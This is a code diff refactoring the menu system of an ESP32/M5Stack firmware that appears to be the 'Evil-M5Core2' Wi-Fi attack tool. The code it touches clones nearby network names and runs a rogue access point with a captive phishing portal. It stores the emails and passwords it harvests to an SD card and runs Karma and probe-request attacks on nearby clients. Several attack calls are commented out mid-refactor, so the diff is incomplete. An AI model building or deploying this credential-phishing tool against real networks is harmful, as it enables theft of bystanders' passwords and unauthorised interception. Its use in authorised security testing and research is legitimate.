@@ -55,6 +55,7 @@
 #include <DNSServer.h>
 #include <SD.h>
 #include <M5Unified.h>
+#include <M5StackMenuSystem.h>
 #include <TinyGPS++.h>
 #include <ArduinoJson.h>
 #include "BLEDevice.h"
@@ -81,6 +82,10 @@ EvilUI ui;
 EvilMonitor monitor;
 TinyGPSPlus gps;
 
+// Set up Menu objects
+Menu mainMenu("Main Menu");
+Menu subMenuSettings("Settings");
+
 // Web and DNS Servers
 WebServer server(80);
 DNSServer dnsServer;
@@ -102,14 +107,12 @@ const char* bluetoothName = BLUETOOTH_NAME;
 
 String portalFiles[30]; // 30 portals max
 int numPortalFiles = 0;
-String selectedPortalFile = "/sites/normal.html"; // defaut portal
 int portalFileIndex = 0;
 
 
 int nbClientsConnected = 0;
 int nbClientsWasConnected = 0;
 int nbPasswords = 0;
-bool isCaptivePortalOn = false;
 
 
 String macAddresses[10]; // 10 mac address max
@@ -180,13 +183,18 @@ int maxChannelScanning = 13;
 String ssidList[100];
 int numSsid = 0;
 int currentListIndex = 0;
-String clonedSSID = "Evil-M5Core2";
 int topVisibleIndex = 0;
 
 const byte DNS_PORT = 53;
 unsigned long previousMillis = 0;
 const long interval = 1000;
 static constexpr const gpio_num_t SDCARD_CSPIN = GPIO_NUM_4;
+
+
+String clonedSSID;
+bool isCaptivePortalOn;
+bool bluetoothEnabled;
+String selectedPortalFile;
 
 
 void setup() {
@@ -385,7 +393,7 @@ void setup() {
     }
 
     // Check battery level, display warning if low
-    String batteryLevelStr = getBatteryLevel();
+    String batteryLevelStr = monitor.getBatteryLevel();
     int batteryLevel = batteryLevelStr.toInt();
 
     if (batteryLevel < 15) {
@@ -406,7 +414,6 @@ void setup() {
     sendMessage(" ");
     sendMessage(randomMessage);
     sendMessage("-------------------");
-
 
     // Scan for local Wifi networks
     firstScanWifiNetworks();
@@ -442,41 +449,143 @@ void setup() {
 #if GPS_ENABLED
     Serial2.begin(9600, SERIAL_8N1, GPS_RX_PIN, GPS_TX_PIN);  //  GPS, change RX_PIN et TX_PIN if needed
 #endif
+
+    // Define Main Menu
+    mainMenu.addMenuItem("Scan WiFi", scanWifiNetworks);
+    mainMenu.addMenuItem("Select Network", showWifiList);
+    mainMenu.addMenuItem("Clone & Details", showWifiList);
+    mainMenu.addMenuItem("Start Captive Portal", createCaptivePortal);
+    mainMenu.addMenuItem("Stop Captive Portal", stopCaptivePortal);
+    mainMenu.addMenuItem("Change Portal", stopCaptivePortal);
+    mainMenu.addSubMenu("Settings", &subMenuSettings);
+
+    // Define Settings Menu
+    subMenuSettings.addMenuItem("Monitor Status", monitor.emptyMonitorCallback, showMonitorStatus);
+    subMenuSettings.addMenuItem("Adjust Brightness", brightness);
+    subMenuSettings.addMenuItem("Toggle BLE Radio", onOffBleSerial);
+    subMenuSettings.addMenuItem("Check Credentials", checkCredentials);
+    subMenuSettings.addMenuItem("Delete All Credentials", deleteCredentials);
+    subMenuSettings.addMenuItem("Delete All Probes", deleteAllProbes);
+
+    //customizeLayout();
+
+    // TODO: Remove random initialization of global variables
+    clonedSSID = "Evil-M5Core2";
+    isCaptivePortalOn = false;
+    bluetoothEnabled = false;
+    selectedPortalFile = "/sites/normal.html"; // defaut portal
+}
+
+
+void customizeLayout() {
+    // customize layout
+    Layout& layout = mainMenu.getLayout();
+
+    // smaller font
+    layout.MENU_FONT_SIZE = 1;
+
+    // monochrome theme
+    layout.TOP_BAR_TITLE_COLOR = WHITE;
+    layout.TOP_BAR_BACKGROUND_COLOR = PURPLE;
+
+    layout.MENU_ITEM_TEXT_COLOR = WHITE;
+    layout.MENU_ITEM_BACKGROUND_COLOR = BLACK;
+    layout.MENU_ITEM_HIGHLIGHTED_TEXT_COLOR = BLACK;
+    layout.MENU_ITEM_HIGHLIGHTED_BACKGROUND_COLOR = WHITE;
+    layout.MENU_ITEM_HIGHLIGHTED_ICON_SIZE = 3;
+
+    layout.BOTTOM_BAR_BACKGROUND_COLOR = DARKGREY;
+    layout.BOTTOM_BAR_SOFTKEY_COLOR = WHITE;
+    layout.BOTTOM_BAR_SOFTKEY_BACKGROUND_COLOR = DARKGREY;
 }
 
 
 void loop() {
     M5.update();
     handleDnsRequestSerial();
-    ui.menuLoop();
+
+    // Menu loop
+    if (mainMenu.isEnabled()) {
+        mainMenu.loop();
+    } else {
+        M5.Lcd.clear(BLACK);
+
+        if (M5.BtnA.wasReleased() || M5.BtnB.wasReleased() || M5.BtnC.wasReleased()) {
+            mainMenu.enable();
+        }
+    }
 }
 
 
-void firstScanWifiNetworks() {
+int scanAvailableSSID() {
+    // Scan for Wifi networks, store all found SSID to ssidList and
+    // return number of SSID found.
     WiFi.mode(WIFI_STA);
     WiFi.disconnect();
     unsigned long startTime = millis();
     int n;
+
     while (millis() - startTime < 2000) {
         n = WiFi.scanNetworks();
         if (n != WIFI_SCAN_RUNNING) break;
     }
 
+    numSsid = min(n, 100);
+    for (int i = 0; i < numSsid; i++) {
+        ssidList[i] = WiFi.SSID(i);
+    }
+
+    return n;
+}
+
+void firstScanWifiNetworks() {
+    // Run first scan of available SSID and output
+    int n = scanAvailableSSID();
+
     if (n == 0) {
         sendMessage("No network found ...");
     } else {
-        sendMessage(String(n));
         sendMessage(" Near Wifi Networks : ");
         sendMessage("-------------------");
-        numSsid = min(n, 100);
         for (int i = 0; i < numSsid; i++) {
-            ssidList[i] = WiFi.SSID(i);
             sendMessage(String(i) + ": " + ssidList[i]);
         }
         sendMessage("-------------------");
     }
 }
 
+
+void scanWifiNetworks(CallbackMenuItem& menuItem) {
+    ui.writeSingleMessage("Scan in progress...");
+    firstScanWifiNetworks();
+    ui.waitAndReturnToMenu("Scan Completed");
+}
+
+
+File openFile(String filename, const char* mode = FILE_READ) {
+    File file = SD.open(filename, mode);
+    if (!file) {
+        sendMessage("Error opening " + filename);
+        return File();
+    }
+    return file;
+}
+
+
+void showMonitorStatus(CallbackMenuItem& menuItem) {
+    monitor.showMonitorPage();
+
+    if (M5.BtnA.wasReleased()) {
+        monitor.nextPage();
+    } else if (M5.BtnB.wasReleased()) {
+        monitor.prevPage();
+    } else if (M5.BtnC.wasReleased()) {
+        menuItem.deactivateCallbacks();
+    }
+}
+
+
+// *** OLD CODE ***
 
 void handleDnsRequestSerial() {
     if (isCaptivePortalOn) {
@@ -500,10 +609,8 @@ void handleDnsRequestSerial() {
     }
 }
 
-bool bluetoothEnabled = false;
 
-void onOffBleSerial() {
-    M5.Display.setTextColor(TFT_WHITE);
+void onOffBleSerial(CallbackMenuItem& menuItem) {
     if (bluetoothEnabled) {
         ui.waitAndReturnToMenu("   Bluetooth OFF");
         ESP_BT.end();
@@ -526,11 +633,7 @@ void onOffBleSerial() {
 
 
 void listProbesSerial() {
-    File file = SD.open("/probes.txt", FILE_READ);
-    if (!file) {
-        sendMessage("Failed to open probes.txt");
-        return;
-    }
+    File file = openFile("/probes.txt", FILE_READ);
 
     int probeIndex = 0;
     sendMessage("List of Probes:");
@@ -546,11 +649,7 @@ void listProbesSerial() {
 }
 
 void selectProbeSerial(int index) {
-    File file = SD.open("/probes.txt", FILE_READ);
-    if (!file) {
-        sendMessage("Failed to open probes.txt");
-        return;
-    }
+    File file = openFile("/probes.txt", FILE_READ);
 
     int currentIndex = 0;
     String selectedProbe = "";
@@ -596,7 +695,7 @@ void checkSerialCommands(String command, bool fromBluetooth) {
     if (connectionState == AUTHENTICATED || !fromBluetooth) {
         if (command == "scan_wifi") {
             ui.setOperationInProgress();
-            scanWifiNetworks();
+            //scanWifiNetworks();
             sendMessage("-------------------");
             sendMessage("Near Wifi Network : ");
             for (int i = 0; i < numSsid; i++) {
@@ -635,13 +734,13 @@ void checkSerialCommands(String command, bool fromBluetooth) {
             cloneSSIDForCaptivePortal(currentlySelectedSSID);
             sendMessage("Cloned SSID: " + clonedSSID);
         } else if (command == "start_portal") {
-            createCaptivePortal();
+            //createCaptivePortal();
             sendMessage("Start portal with " + clonedSSID);
         } else if (command == "stop_portal") {
-            stopCaptivePortal();
+            //stopCaptivePortal();
             sendMessage("Portal Stopped ");
         } else if (command == "list_portal") {
-            File root = SD.open("/sites");
+            File root = openFile("/sites", FILE_READ);
             numPortalFiles = 0;
             sendMessage("-------------------");
             sendMessage("Availables portals :");
@@ -665,7 +764,7 @@ void checkSerialCommands(String command, bool fromBluetooth) {
         } else if (command == "check_credentials") {
             checkCredentialsSerial();
         } else if (command == "monitor_status") {
-            String status = getMonitoringStatus();
+            String status = monitor.getMonitoringStatus();
             sendMessage("-------------------");
             sendMessage(status);
         } else if (command == "probe_attack") {
@@ -748,38 +847,10 @@ void sendMessage(String message) {
     ESP_BT.print(message + "\n");
 }
 
-String getMonitoringStatus() {
-    String status;
-    int numClientsConnected = WiFi.softAPgetStationNum();
-    int numCredentials = countPasswordsInFile();
-
-    status += "Clients: " + String(numClientsConnected) + "\n";
-    status += "Credentials: " + String(numCredentials) + "\n";
-    status += "SSID: " + String(clonedSSID) + "\n";
-    status += "Portal: " + String(isCaptivePortalOn ? "On" : "Off") + "\n";
-    status += "Page: " + String(selectedPortalFile.substring(7)) + "\n";
-    status += "Bluetooth: " + String(bluetoothEnabled ? "ON" : "OFF") + "\n";
-    updateConnectedMACs();
-    status += "Connected MACs:\n";
-    for (int i = 0; i < 10; i++) {
-        if (macAddresses[i] != "") {
-            status += macAddresses[i] + "\n";
-        }
-    }
-    status += "Stack left: " + getStack() + " Kb\n";
-    status += "RAM: " + getRamUsage() + " Mo\n";
-    status += "Battery: " + getBatteryLevel() + "%\n"; // thx to kdv88 to pointing this correction
-    status += "Temperature: " + getTemperature() + "C\n";
-    return status;
-}
-
 
 void checkCredentialsSerial() {
-    File file = SD.open("/credentials.txt");
-    if (!file) {
-        sendMessage("Failed to open credentials file");
-        return;
-    }
+    File file = openFile("/credentials.txt");
+
     bool isEmpty = true;
     sendMessage("----------------------");
     sendMessage("Credentials Found:");
@@ -798,7 +869,8 @@ void checkCredentialsSerial() {
 }
 
 void changePortal(int index) {
-    File root = SD.open("/sites");
+    File root = openFile("/sites");
+
     int currentIndex = 0;
     String selectedFile;
     while (File file = root.openNextFile()) {
@@ -827,37 +899,8 @@ void selectNetwork(int index) {
     }
 }
 
-void scanWifiNetworks() {
-    WiFi.mode(WIFI_STA);
-    WiFi.disconnect();
-    unsigned long startTime = millis();
-    int n;
-    while (millis() - startTime < 5000) {
-        M5.Display.clear();
-        M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, TFT_BLACK);
-        M5.Display.setCursor(50 , M5.Display.height()/ 2 );
-        M5.Display.print("Scan in progress... ");
-        sendMessage("-------------------");
-        sendMessage("WiFi Scan in progress... ");
-        M5.Display.display();
-        n = WiFi.scanNetworks();
-        if (n != WIFI_SCAN_RUNNING) break;
-    }
-    sendMessage("-------------------");
-    sendMessage("Near Wifi Network : ");
-    numSsid = min(n, 100);
-    for (int i = 0; i < numSsid; i++) {
-        ssidList[i] = WiFi.SSID(i);
-        sendMessage(String(i) + ": " + ssidList[i]);
-    }
-    sendMessage("-------------------");
-    sendMessage("WiFi Scan Completed ");
-    sendMessage("-------------------");
-    ui.waitAndReturnToMenu("Scan Completed");
-}
 
-
-void showWifiList() {
+void showWifiList(CallbackMenuItem& menuItem) {
     const int listDisplayLimit = M5.Display.height() / 18;
     int listStartIndex = max(0, min(currentListIndex, numSsid - listDisplayLimit));
 
@@ -883,13 +926,13 @@ void showWifiList() {
             if (currentListIndex < 0) {
                 currentListIndex = numSsid - 1;
             }
-            showWifiList();
+            //showWifiList();
         } else if (M5.BtnC.wasPressed()) {
             currentListIndex++;
             if (currentListIndex >= numSsid) {
                 currentListIndex = 0;
             }
-            showWifiList();
+            //showWifiList();
         } else if (M5.BtnB.wasPressed()) {
             ui.setInMenu(true);
             sendMessage("-------------------");
@@ -969,14 +1012,12 @@ void showWifiDetails(int &networkIndex) {
             ui.setInMenu(true);
             ui.waitAndReturnToMenu(ssidList[networkIndex] + " Cloned...");
             sendMessage(ssidList[networkIndex] + " Cloned...");
-            ui.drawMenu();
             break; // Sortir de la boucle
         } else if (M5.BtnA.wasPressed()) {
             networkIndex = (networkIndex + 1) % numSsid;
             updateDisplay();
         } else if (M5.BtnB.wasPressed()) {
             ui.setInMenu(true);
-            ui.drawMenu();
             break;
         } else if (M5.BtnPWR.wasClicked()) {
             networkIndex = (networkIndex - 1 + numSsid) % numSsid;
@@ -1016,7 +1057,7 @@ void cloneSSIDForCaptivePortal(String ssid) {
     clonedSSID = ssid;
 }
 
-void createCaptivePortal() {
+void createCaptivePortal(CallbackMenuItem& menuItem) {
     String ssid = clonedSSID.isEmpty() ? "Evil-M5Core2" : clonedSSID;
     WiFi.mode(WIFI_MODE_APSTA);
     if (!isAutoKarmaActive){
@@ -1068,7 +1109,8 @@ void createCaptivePortal() {
     server.on("/credentials", HTTP_GET, []() {
         String password = server.arg("pass");
         if (password == accessWebPassword) {
-            File file = SD.open("/credentials.txt");
+            File file = openFile("/credentials.txt");
+
             if (file) {
                 if (file.size() == 0) {
                     server.send(200, "text/html", "<html><body><p>No credentials...</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
@@ -1235,7 +1277,7 @@ void handleSdCardBrowse() {
     String dirPath = server.arg("dir");
     if (dirPath == "") dirPath = "/";
 
-    File dir = SD.open(dirPath);
+    File dir = openFile(dirPath);
     if (!dir || !dir.isDirectory()) {
         server.send(404, "text/html", "<html><body><p>Directory not found.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
         return;
@@ -1397,7 +1439,7 @@ void handleFileDelete() {
 }
 
 void servePortalFile(const String& filename) {
-    File webFile = SD.open(filename);
+    File webFile = openFile(filename);
     if (webFile) {
         server.streamFile(webFile, "text/html");
         /*sendMessage("-------------------");
@@ -1411,7 +1453,7 @@ void servePortalFile(const String& filename) {
 
 
 void saveCredentials(const String& email, const String& password, const String& portalName, const String& clonedSSID) {
-    File file = SD.open("/credentials.txt", FILE_APPEND);
+    File file = openFile("/credentials.txt", FILE_APPEND);
     if (file) {
         file.println("-- Email -- \n" + email);
         file.println("-- Password -- \n" + password);
@@ -1430,7 +1472,7 @@ void saveCredentials(const String& email, const String& password, const String& 
 }
 
 
-void stopCaptivePortal() {
+void stopCaptivePortal(CallbackMenuItem& menuItem) {
     dnsServer.stop();
     server.stop();
     WiFi.mode(WIFI_MODE_APSTA);
@@ -1445,8 +1487,9 @@ void stopCaptivePortal() {
     ui.waitAndReturnToMenu("  Portal Stopped");
 }
 
-void listPortalFiles() {
-    File root = SD.open("/sites");
+void listPortalFiles(CallbackMenuItem& menuItem) {
+    File root = openFile("/sites");
+
     numPortalFiles = 0;
     sendMessage("Available portals:");
     while (File file = root.openNextFile()) {
@@ -1508,7 +1551,7 @@ void handleChangePassword() {
 
 
 void changePortal() {
-    listPortalFiles();
+    //listPortalFiles();
     const int listDisplayLimit = M5.Display.height() / 18;
     bool needDisplayUpdate = true;
 
@@ -1561,7 +1604,8 @@ String credentialsList[100]; // max 100 lignes parsed
 int numCredentials = 0;
 
 void readCredentialsFromFile() {
-    File file = SD.open("/credentials.txt");
+    File file = openFile("/credentials.txt");
+
     if (file) {
         numCredentials = 0;
         while (file.available() && numCredentials < 100) {
@@ -1573,7 +1617,7 @@ void readCredentialsFromFile() {
     }
 }
 
-void checkCredentials() {
+void checkCredentials(CallbackMenuItem& menuItem) {
     readCredentialsFromFile(); // Assume this populates a global array or vector with credentials
 
     // Initial display setup
@@ -1604,7 +1648,6 @@ void checkCredentials() {
 
     // Return to menu or next operation
     ui.setInMenu(true); // Assuming this flag controls whether you're in the main menu
-    ui.drawMenu(); // Redraw the main menu
 }
 
 void displayCredentials(int index) {
@@ -1654,41 +1697,10 @@ void displayCredentials(int index) {
 }
 
 
+void deleteCredentials(CallbackMenuItem& menuItem) {
+    if (ui.confirmPopup("Delete credentials?")) {
+        File file = openFile("/credentials.txt", FILE_WRITE);
 
-bool confirmPopup(String message) {
-    bool confirm = false;
-    bool decisionMade = false;
-
-    M5.Display.clear();
-    M5.Display.setCursor(50, M5.Display.height()/2);
-    M5.Display.setTextColor(TFT_WHITE);
-    M5.Display.println(message);
-    M5.Display.setCursor(37, 220);
-    M5.Display.setTextColor(TFT_GREEN);
-    M5.Display.println("Yes");
-    M5.Display.setTextColor(TFT_RED);
-    M5.Display.setCursor(254, 220);
-    M5.Display.println("No");
-    M5.Display.setTextColor(TFT_WHITE);
-
-    while (!decisionMade) {
-        M5.update();
-        if (M5.BtnA.wasPressed()) {
-            confirm = true;
-            decisionMade = true;
-        }
-        if (M5.BtnC.wasPressed()) {
-            confirm = false;
-            decisionMade = true;
-        }
-    }
-
-    return confirm;
-}
-
-void deleteCredentials() {
-    if (confirmPopup("Delete credentials?")) {
-        File file = SD.open("/credentials.txt", FILE_WRITE);
         if (file) {
             file.close();
             sendMessage("-------------------");
@@ -1710,11 +1722,7 @@ void deleteCredentials() {
 
 
 int countPasswordsInFile() {
-    File file = SD.open("/credentials.txt");
-    if (!file) {
-        sendMessage("Error opening credentials file for reading");
-        return 0;
-    }
+    File file = openFile("/credentials.txt");
 
     int passwordCount = 0;
     while (file.available()) {
@@ -1726,253 +1734,6 @@ int countPasswordsInFile() {
 
     file.close();
     return passwordCount;
-}
-
-
-int oldNumClients = -1;
-int oldNumPasswords = -1;
-String isBluetoothEnabled;
-
-void displayMonitorPage1() {
-    M5.Display.clear();
-    M5.Display.setTextSize(2);
-    M5.Display.setTextColor(TFT_WHITE);
-
-    M5.Display.setCursor(10, 90);
-    M5.Display.println("SSID: " + clonedSSID);
-    M5.Display.setCursor(10, 120);
-    M5.Display.println("Portal: " + String(isCaptivePortalOn ? "On" : "Off"));
-    M5.Display.setCursor(10, 150);
-    M5.Display.println("Page: " + selectedPortalFile.substring(7));
-
-    if (bluetoothEnabled) {
-        isBluetoothEnabled = "ON";
-    } else {
-        isBluetoothEnabled = "OFF";
-    }
-    M5.Display.setCursor(10, 180);
-    M5.Display.println("Bluetooth: " + isBluetoothEnabled);
-
-    oldNumClients = -1;
-    oldNumPasswords = -1;
-
-    M5.Display.display();
-
-    while (!ui.getInMenu()) {
-        M5.update();
-        handleDnsRequestSerial();
-        server.handleClient();
-
-        int newNumClients = WiFi.softAPgetStationNum();
-        int newNumPasswords = countPasswordsInFile();
-
-        if (newNumClients != oldNumClients) {
-            M5.Display.fillRect(10, 30, 200, 20, TFT_BLACK);
-            M5.Display.setCursor(10, 30);
-            M5.Display.println("Clients: " + String(newNumClients));
-            oldNumClients = newNumClients;
-        }
-
-        if (newNumPasswords != oldNumPasswords) {
-            M5.Display.fillRect(10, 60, 200, 20, TFT_BLACK);
-            M5.Display.setCursor(10, 60);
-            M5.Display.println("Passwords: " + String(newNumPasswords));
-            oldNumPasswords = newNumPasswords;
-        }
-
-        if (M5.BtnA.wasPressed()) {
-            displayMonitorPage3();
-            break;
-        } else if (M5.BtnC.wasPressed()) {
-            displayMonitorPage2();
-            break;
-        } else if (M5.BtnB.wasPressed()) {
-            ui.setInMenu(true);
-            ui.drawMenu();
-            break;
-        }
-
-        delay(100);
-    }
-}
-
-void updateConnectedMACs() {
-    wifi_sta_list_t stationList;
-    tcpip_adapter_sta_list_t adapterList;
-    esp_wifi_ap_get_sta_list(&stationList);
-    tcpip_adapter_get_sta_list(&stationList, &adapterList);
-
-    for (int i = 0; i < adapterList.num; i++) {
-        char macStr[18];
-        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
-                 adapterList.sta[i].mac[0], adapterList.sta[i].mac[1], adapterList.sta[i].mac[2],
-                 adapterList.sta[i].mac[3], adapterList.sta[i].mac[4], adapterList.sta[i].mac[5]);
-        macAddresses[i] = String(macStr);
-    }
-}
-
-void displayMonitorPage2() {
-    M5.Display.clear();
-    M5.Display.setTextSize(2);
-    updateConnectedMACs();
-    if (macAddresses[0] == "") {
-        M5.Display.setCursor(10, 30);
-        M5.Display.println("No client connected");
-        sendMessage("----Mac-Address----");
-        sendMessage("No client connected");
-        sendMessage("-------------------");
-    } else {
-        sendMessage("----Mac-Address----");
-        for (int i = 0; i < 10; i++) {
-            int y = 30 + i * 20;
-            if (y > M5.Display.height() - 20) break;
-
-            M5.Display.setCursor(10, y);
-            M5.Display.println(macAddresses[i]);
-            sendMessage(macAddresses[i]);
-        }
-        sendMessage("-------------------");
-    }
-
-
-    M5.Display.display();
-
-    while (!ui.getInMenu()) {
-        M5.update();
-        handleDnsRequestSerial();
-        if (M5.BtnA.wasPressed()) {
-            displayMonitorPage1();
-            break;
-        } else if (M5.BtnC.wasPressed()) {
-            displayMonitorPage3();
-            break;
-        } else if (M5.BtnB.wasPressed()) {
-            ui.setInMenu(true);
-            ui.drawMenu();
-            break;
-        }
-    }
-}
-
-String oldStack = "";
-String oldRamUsage = "";
-String oldBatteryLevel = "";
-String oldTemperature = "";
-
-String getBatteryLevel() {
-    return String(M5.Power.getBatteryLevel());
-}
-
-String getTemperature() {
-    float temperature;
-    M5.Imu.getTemp(&temperature);
-    int roundedTemperature = round(temperature);
-    return String(roundedTemperature);
-}
-
-String getStack() {
-    UBaseType_t stackWordsRemaining = uxTaskGetStackHighWaterMark(NULL);
-    return String(stackWordsRemaining * 4 / 1024.0);
-}
-
-String getRamUsage() {
-    float heapSizeInMegabytes = esp_get_free_heap_size() / 1048576.0;
-    char buffer[10];
-    sprintf(buffer, "%.2f", heapSizeInMegabytes);
-    return String(buffer);
-}
-
-unsigned long lastUpdateTime = 0;
-const long updateInterval = 1000;
-
-void displayMonitorPage3() {
-    M5.Display.clear();
-    M5.Display.setTextSize(2);
-    M5.Display.setTextColor(TFT_WHITE);
-
-    oldStack = getStack();
-    oldRamUsage = getRamUsage();
-    oldBatteryLevel = getBatteryLevel();
-    oldTemperature = getTemperature();
-
-    M5.Display.setCursor(10, 30);
-    M5.Display.println("Stack left: " + oldStack + " Kb");
-    M5.Display.setCursor(10, 60);
-    M5.Display.println("RAM: " + oldRamUsage + " Mo");
-    M5.Display.setCursor(10, 90);
-    M5.Display.println("Battery: " + oldBatteryLevel + "%"); // thx to kdv88 to pointing mistranlastion
-    M5.Display.setCursor(10, 120);
-    M5.Display.println("Temperature: " + oldTemperature + "C");
-
-    M5.Display.display();
-
-    lastUpdateTime = millis();
-
-    oldStack = "";
-    oldRamUsage = "";
-    oldBatteryLevel = "";
-    oldTemperature = "";
-
-    M5.Display.display();
-
-    while (!ui.getInMenu()) {
-        M5.update();
-        handleDnsRequestSerial();
-
-        unsigned long currentMillis = millis();
-
-
-        if (currentMillis - lastUpdateTime >= updateInterval) {
-            String newStack = getStack();
-            String newRamUsage = getRamUsage();
-            String newBatteryLevel = getBatteryLevel();
-            String newTemperature = getTemperature();
-
-            if (newStack != oldStack) {
-                M5.Display.fillRect(10, 30, 200, 20, TFT_BLACK);
-                M5.Display.setCursor(10, 30);
-                M5.Display.println("Stack left: " + newStack + " Kb");
-                oldStack = newStack;
-            }
-
-            if (newRamUsage != oldRamUsage) {
-                M5.Display.fillRect(10, 60, 200, 20, TFT_BLACK);
-                M5.Display.setCursor(10, 60);
-                M5.Display.println("RAM: " + newRamUsage + " Mo");
-                oldRamUsage = newRamUsage;
-            }
-
-            if (newBatteryLevel != oldBatteryLevel) {
-                M5.Display.fillRect(10, 90, 200, 20, TFT_BLACK);
-                M5.Display.setCursor(10, 90);
-                M5.Display.println("Battery: " + newBatteryLevel + "%");// thx to kdv88 to pointing mistranlastion
-                oldBatteryLevel = newBatteryLevel;
-            }
-
-            if (newTemperature != oldTemperature) {
-                M5.Display.fillRect(10, 120, 200, 20, TFT_BLACK);
-                M5.Display.setCursor(10, 120);
-                M5.Display.println("Temperature: " + newTemperature + "C");
-                oldTemperature = newTemperature;
-            }
-
-            lastUpdateTime = currentMillis;
-        }
-
-        if (M5.BtnA.wasPressed()) {
-            displayMonitorPage2();
-            break;
-        } else if (M5.BtnC.wasPressed()) {
-            displayMonitorPage1();
-            break;
-        } else if (M5.BtnB.wasPressed()) {
-            ui.setInMenu(true);
-            ui.drawMenu();
-            break;
-        }
-
-        delay(100);
-    }
 }
 
 
@@ -2006,7 +1767,7 @@ void karmaAttack() {
 }
 
 
-void brightness() {
+void brightness(CallbackMenuItem& menuItem) {
     int currentBrightness = M5.Display.getBrightness();
     int minBrightness = 1;
     int maxBrightness = 255;
@@ -2108,7 +1869,8 @@ void packetSnifferKarma(void* buf, wifi_promiscuous_pkt_type_t type) {
 
 void saveSSIDToFile(const char* ssid) {
     bool ssidExists = false;
-    File readfile = SD.open("/probes.txt", FILE_READ);
+    File readfile = openFile("/probes.txt", FILE_READ);
+
     if (readfile) {
         while (readfile.available()) {
             String line = readfile.readStringUntil('\n');
@@ -2120,7 +1882,7 @@ void saveSSIDToFile(const char* ssid) {
         readfile.close();
     }
     if (!ssidExists) {
-        File file = SD.open("/probes.txt", FILE_APPEND);
+        File file = openFile("/probes.txt", FILE_APPEND);
         if (file) {
             file.println(ssid);
             file.close();
@@ -2232,7 +1994,7 @@ void stopScanKarma() {
         }
         sendMessage(String(ssid_count_Karma) + " SSIDs saved on SD.");
     } else if (isProbeSniffingMode && ssid_count_Karma > 0) {
-        bool saveSSID = confirmPopup("   Save " + String(ssid_count_Karma) + " SSIDs?");
+        bool saveSSID = ui.confirmPopup("   Save " + String(ssid_count_Karma) + " SSIDs?");
         if (saveSSID) {
             M5.Display.clear();
             M5.Display.setCursor(50 , M5.Display.height()/ 2 );
@@ -2267,7 +2029,6 @@ void stopScanKarma() {
     } else {
         currentStateKarma = StartScanKarma;
         ui.setInMenu(true);
-        ui.drawMenu();
     }
     isKarmaMode = false;
     isProbeSniffingMode = false;
@@ -2347,7 +2108,7 @@ void startAPWithSSIDKarma(const char* ssid) {
     clonedSSID = String(ssid);
     isProbeKarmaAttackMode = true;
     config.readConfigFile();
-    createCaptivePortal();
+    //createCaptivePortal();
 
     sendMessage("-------------------");
     sendMessage("Karma Attack started for: " + String(ssid));
@@ -2404,15 +2165,13 @@ void startAPWithSSIDKarma(const char* ssid) {
         }
     }
 
-    M5.Display.clear();
-    M5.Display.setCursor(50 , M5.Display.height()/ 2 );
     if (clientCount > 0) {
-        M5.Display.println("Karma Successful!!!");
+        ui.writeSingleMessage("Karma Successful!!!");
         sendMessage("-------------------");
         sendMessage("Karma Attack worked !");
         sendMessage("-------------------");
     } else {
-        M5.Display.println(" Karma Failed...");
+        ui.writeSingleMessage(" Karma Failed...");
         sendMessage("-------------------");
         sendMessage("Karma Attack failed...");
         sendMessage("-------------------");
@@ -2420,25 +2179,18 @@ void startAPWithSSIDKarma(const char* ssid) {
         WiFi.mode(WIFI_STA);
     }
     delay(2000);
-    if (confirmPopup("Save " + String(ssid) + " ?" )) {
+    if (ui.confirmPopup("Save " + String(ssid) + " ?" )) {
         saveSSIDToFile(ssid);
     }
-    ui.resetLastIndex();
     ui.setInMenu(true);
     isProbeKarmaAttackMode = false;
     currentStateKarma = StartScanKarma;
     memset(ssidsKarma, 0, sizeof(ssidsKarma));
     ssid_count_Karma = 0;
-    ui.drawMenu();
 }
 
 void listProbes() {
-    File file = SD.open("/probes.txt", FILE_READ);
-    if (!file) {
-        sendMessage("Failed to open probes.txt");
-        ui.waitAndReturnToMenu("Failed to open probes.txt");
-        return;
-    }
+    File file = openFile("/probes.txt", FILE_READ);
 
     String probes[MAX_SSIDS_Karma];
     int numProbes = 0;
@@ -2531,14 +2283,7 @@ bool isProbePresent(String probes[], int numProbes, String probe) {
 
 
 void deleteProbe() {
-    File file = SD.open("/probes.txt", FILE_READ);
-    if (!file) {
-        sendMessage("-------------------");
-        sendMessage("Failed to open probes.txt");
-        sendMessage("-------------------");
-        ui.waitAndReturnToMenu("Failed to open probes.txt");
-        return;
-    }
+    File file = openFile("/probes.txt", FILE_READ);
 
     String probes[MAX_SSIDS_Karma];
     int numProbes = 0;
@@ -2607,7 +2352,7 @@ void deleteProbe() {
     bool success = false;
     if (selectedIndex >= 0 && selectedIndex < numProbes) {
         String selectedProbe = probes[selectedIndex];
-        if (confirmPopup("Delete " + selectedProbe + " probe ?")) {
+        if (ui.confirmPopup("Delete " + selectedProbe + " probe ?")) {
             success = removeProbeFromFile("/probes.txt", selectedProbe);
         }
 
@@ -2670,16 +2415,14 @@ int showProbesAndSelect(String probes[], int numProbes) {
 }
 
 bool removeProbeFromFile(const char* filepath, const String& probeToRemove) {
-    File originalFile = SD.open(filepath, FILE_READ);
+    File originalFile = openFile(filepath, FILE_READ);
     if (!originalFile) {
-        sendMessage("Failed to open the original file for reading");
         return false;
     }
 
     const char* tempFilePath = "/temp.txt";
-    File tempFile = SD.open(tempFilePath, FILE_WRITE);
+    File tempFile = openFile(tempFilePath, FILE_WRITE);
     if (!tempFile) {
-        sendMessage("Failed to open the temp file for writing");
         originalFile.close();
         return false;
     }
@@ -2707,9 +2450,9 @@ bool removeProbeFromFile(const char* filepath, const String& probeToRemove) {
     return probeRemoved;
 }
 
-void deleteAllProbes(){
-    if (confirmPopup("Delete All Probes ?")) {
-        File file = SD.open("/probes.txt", FILE_WRITE);
+void deleteAllProbes(CallbackMenuItem& menuItem){
+    if (ui.confirmPopup("Delete All Probes ?")) {
+        File file = openFile("/probes.txt", FILE_WRITE);
         if (file) {
             file.close();
             ui.waitAndReturnToMenu("Deleted successfully");
@@ -2782,7 +2525,7 @@ void probeAttack() {
     useCustomProbes = false;
 
     if (!isItSerialCommand){
-        useCustomProbes = confirmPopup("Use custom probes?");
+        useCustomProbes = ui.confirmPopup("Use custom probes?");
         M5.Display.clear();
         if (useCustomProbes) {
             customProbes = config.readCustomProbes();
@@ -2866,7 +2609,6 @@ void probeAttack() {
     restoreOriginalWiFiSettings();
     useCustomProbes = false;
     ui.setInMenu(true);
